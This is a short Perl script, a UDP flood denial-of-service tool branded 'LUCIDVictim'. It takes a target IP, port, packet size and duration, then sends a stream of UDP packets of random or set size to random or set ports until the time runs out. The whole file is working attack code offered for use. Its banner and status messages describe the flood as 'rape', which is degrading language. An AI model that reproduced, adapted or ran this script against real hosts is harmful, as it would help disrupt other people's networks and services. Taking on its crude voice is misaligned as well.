#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 

##
# Ran LUCIDVictim
##

use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD BLUE<<EOTEXT;
 __    _  _   ___  __  ____ 
(  )  / )( \ / __)(  )(    \
/ (_/\) \/ (( (__  )(  ) D (
\____/\____/ \___)(__)(____/


EOTEXT

print BOLD GREEN<<EOTEXT;
SLAMMING ALL THE SKIDS
EOTEXT

print "Sending packets to  $ip " . ($port ? $port : "random") . "
Getting Raped by LUCIDVictim " .
  ($size ? "$size byte's" : "Error..") . "
INTENSE RAPE " .
  ($time ? " for $time seconds" : "") . "\n";

print BOLD WHITE<<EOTEXT;
"STOP THE BRUTAL RAPING! with CTRL-C" unless it has been $time seconds;
EOTEXT

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
  